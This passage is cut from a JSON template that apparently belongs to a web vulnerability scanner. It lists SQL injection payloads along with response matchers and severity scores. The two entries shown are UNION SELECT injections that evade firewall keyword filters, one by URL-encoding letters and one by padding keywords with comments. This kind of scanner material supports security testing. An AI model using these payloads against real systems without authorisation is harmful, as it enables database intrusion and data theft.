          ],
          "severity": "high",
          "confidence_boost": 45,
          "variables": {}
        },
        {
          "payload": "{{baseline}}' %55NION %53ELECT NULL-- -",
          "description": "URL-encoded UNION SELECT (%55=U, %53=S) bypasses static keyword filters checking for literal strings",
          "matchers": [
            {
              "type": "status",
              "status": [
                200
              ]
            },
            {
              "type": "length_diff",
              "min_diff": 50
            }
          ],
          "severity": "high",
          "confidence_boost": 40,
          "variables": {}
        },
        {
          "payload": "{{baseline}}'/**/UNION/**/SELECT/**/NULL-- -",
          "description": "Comment-padded UNION SELECT \u2014 C-style comments break keyword detection in many WAF implementations",
          "matchers": [
            {
              "type": "status",
              "status": [
                200
              ]
            },
            {
              "type": "length_diff",
              "min_diff": 50
            }
          ],
          "severity": "high",
          "confidence_boost": 40,
          "variables": {}
